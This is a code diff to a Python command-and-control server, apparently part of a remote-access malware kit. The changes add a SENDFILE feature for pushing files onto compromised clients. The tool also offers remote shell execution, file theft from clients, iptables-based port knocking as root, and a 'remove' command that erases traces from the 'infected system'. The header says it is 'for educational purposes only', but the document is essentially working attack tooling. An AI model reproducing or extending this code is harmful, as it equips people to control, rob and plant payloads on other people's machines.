@@ -3,7 +3,7 @@ __author__     = "rekcah"
 __email__ = "rekcah@keabyte.com"
 __desc__ = "For educational purposes only ;)"
 
-import socket, os, _thread, subprocess, threading, sys, string, secrets
+import socket, os, _thread, subprocess, sys, string, secrets, time
 
 from subprocess import Popen
 from random import randint
@@ -19,14 +19,12 @@ P  = '\033[35m' # purple
 
 # End Print color codes
 
-
 #####################################################################################
-
 
 BUFFER = 4096
 ENCODING = "utf-8"
 
-host = '0.0.0.0'
+server = '0.0.0.0'
 port = 5010
 users = 99
 s = socket.socket()
@@ -44,28 +42,26 @@ log = "/var/log/messages"
 
 connecting = False
 
-
 ######################################################################################
 
-
-def display_help ():
+def displayHelp ():
 
     print(W)
     print("Help : shows all the commands ")
     print("sel [client id] : selects the client with the id")
     print("shell [command] : sends shell command to the client (the client must have been selected prior to this")
     print("getinfo : displays informations on the client's system (the client must have been select prior to this")
-    print("getfile [/path/to/file] : get the file with the path on the client's side")
-    #print("sendfile [/local/path/to/file] [/remote/path/to/file] : uploads the file to the client on the remote path provided")
+    print("getfile [/REMOTE/PATH/TO/FILE] [REMOTE_FILENAME] : get the file with the path on the client's side")
+    print("SENDFILE [/PATH/TO/LOCAL/FILE] [TARGET/FOLDER/ON/CLIENT] [TARGET FILENAME] : uploads the file to the client on the remote path provided")
     print("kill [client_id] : kills the client with the matching id")
     print("remove [client_id] : the client autoremoves itself and leaves no trace on the infected system")
     print("list : lists all connected clients")
     print("exit : Exist the server killing all the connexions (not removing clients)")
     print(W)
 
-def get_response(user, file = False):
+def getResponse(user):
     global clientId, conns, s, BUFFER, connecting, files, filename, ENCODING
-    fileBuffer = None
+    # fileBuffer = None
     while True:
         raw = conns[user].recv(BUFFER)
         data = raw.decode(ENCODING)
@@ -73,7 +69,6 @@ def get_response(user, file = False):
         if "!FILE!" in data.upper() :
             # The client is sending a file!
             # Awesome, let's read it!
-            print("!FILE!")
             if files:
                 print(G + "\n[+] Receiving a file from the client." + W)
                 if not os.path.isdir("data/"):
@@ -86,8 +81,6 @@ def get_response(user, file = False):
 
                 file = open("data/" + filename, "wb")
                 # read bytes
-                # raw = conns[user].recv(BUFFER)
-                # data = raw.decode(ENCODING)
                 while "!ENDFILE!" not in data.upper():
                     tmp = conns[user].recv(BUFFER)
                     data = tmp.decode(ENCODING)
@@ -98,16 +91,21 @@ def get_response(user, file = False):
                 file.close()
                 files = False
                 filename = None
+            else :
+                # We're not expecing a file but we need to read it to empty the socket
+                while "!ENDFILE!" not in data.upper():
+                    tmp = conns[clientId].recv(BUFFER)
+                    data = tmp.decode(ENCODING)
         else :
             print(P + "\n\n[*] Client [%d] response : | \n\n%s" % (user+1, data) + W)
-            # fileBuffer += raw
 
         if not data or connecting:
             break
     print('Closing connections')
     s.close()
 
-def connect_users():
+
+def connectUsers():
     global  connecting, ENCODING, users, s
 
     while True:
@@ -116,30 +114,18 @@ def connect_users():
         connecting = True
         print(G + "\n[+] A new client is connected at [%s,%d] " % addr + W)
         print(G + "\n[+] New client's Id is : >> " + str(len(conns)) + " <<")
-        _thread.start_new_thread(get_response, ((len(conns) - 1),))
+        _thread.start_new_thread(getResponse, ((len(conns) - 1),))
         connecting = False
 
 
-def send_data(user):
-    global BUFFER, ENCODING, conns, connecting
-    while True:
-        data = conns[user].recv(BUFFER).decode(ENCODING)
-        for each in range(len(conns)):
-            conns[each].send(data.encode(ENCODING))
-        if not data or connecting:
-            break
-    print('Closing connections')
-    s.close()
-
-def parse_command():
+def parseCommand():
     global files, filename, clientId, ENCODING, killedId
-    _thread.start_new_thread(connect_users, ())
-    # prompt()
+    _thread.start_new_thread(connectUsers, ())
     while True :
-        cmd = input(B + "\n>>> Your command : " + W)
+        cmd = input(B + "\nYour command >> " + W)
         if cmd.upper() == "HELP":
-            display_help()
-            parse_command()
+            displayHelp()
+            parseCommand()
         elif cmd.upper() == "KILL":
             if clientId < 0:
                 print(R + "[-] You need to select a target client with the 'SEL [id]' command first" + W)
@@ -208,14 +194,33 @@ def parse_command():
                     print(R + "[-] The synthax is SHELL [COMMAND TO EXECUTE]" + W)
                 else :
                     conns[clientId].send(cmd.encode(ENCODING))
+            elif "SENDFILE" in cmd.upper() :
+                # Send a file and eventually
+                print(B + "[*] Sending file to the host" + W)
+                args = cmd.split(" ")
+                if len(args) == 4 :
+                    localFile = args[1]
+                    if os.path.isfile(args[1]):
+                        # File exists we can send it
+                        conns[clientId].send(cmd.encode(ENCODING))
+                        time.sleep(2)
+                        with open(localFile, "rb") as file:
+                            conns[clientId].send("!FILE!".encode(ENCODING))
+                            buff = file.read(BUFFER)
+                            time.sleep(2)
+                            # start sending the file
+                            while buff:
+                                conns[clientId].send(buff)
+                                buff = file.read(BUFFER)
+                        # File sent let's notify the client
+                        conns[clientId].send("!ENDFILE!".encode(ENCODING))
+                    else :
+                        print(R + "[-] The local file does'nt exists..." + R)
+                else :
+                    print(R + "[-] The syntax is SENDFILE [/PATH/TO/LOCAL/FILE] [TARGET/FOLDER/ON/CLIENT] [TARGET FILENAME]" + W)
+            else :
+                displayHelp()
 
-# def daemonStart():
-#     # First config the firewall
-#
-#     tail
-#     return None
-
-# def configFirewall(clean)
 
 def configIptables(clean=True):
     global portSet
@@ -226,8 +231,6 @@ def configIptables(clean=True):
             Popen(["iptables --delete INPUT -p tcp --dport %d -j LOG" % (portSet[i] ^ (_key * 25))],
                   shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
 
-            # print("IPTABLES DELETE RESULT -> %s" % str(op.stdout.read()))
-
     #add this rule : "iptables -I INPUT -p tcp --dport [PORT_NUM] -j LOG"
     for i in range(len(portSet)) :
         # Add the firewall rule for each available port
@@ -237,11 +240,11 @@ def configIptables(clean=True):
 
 def checkPermissions():
     if os.getuid() != 0:
-        print(R + "[-] Sorry, you must be root to run this." + W)
+        print(R + "[-] Sorry, you must be root to run this C&C." + W)
         sys.exit(2)
 
 def main():
-    global s, host, port, users, conns
+    global s, server, port, users, conns
 
     # Check we have the root privs (needed to read the log file)
     checkPermissions()
@@ -269,7 +272,7 @@ def main():
                     print(G + "[+] The door knocked at is : %s" % str(portSet[i]) + W)
                     print(G + "[+] The door Saint Peter will open is : %s " % str(port) + W)
                     try :
-                        s.bind((host, port))
+                        s.bind((server, port))
                         s.listen(users)
                     except Exception as e :
                         print(R + "[-] An error occured, unable to bind the port.. [%s]" % str(e) + W)
@@ -283,15 +286,13 @@ def main():
 
     # the client has knocked at the heavens doors, we'll open'em up to it
 
-    # s.bind((host, port))
-    # s.listen(users)
-    print('Listening for connections')
+    print(G + "[+] Server started... Waiting for the snitches..." + W)
 
-    # _thread.start_new_thread(connect_users, ())
-    _thread.start_new_thread(parse_command(), ())
+    _thread.start_new_thread(parseCommand(), ())
 
     while True:
         pass
+
     s.close()
     sys.exit(0)
 
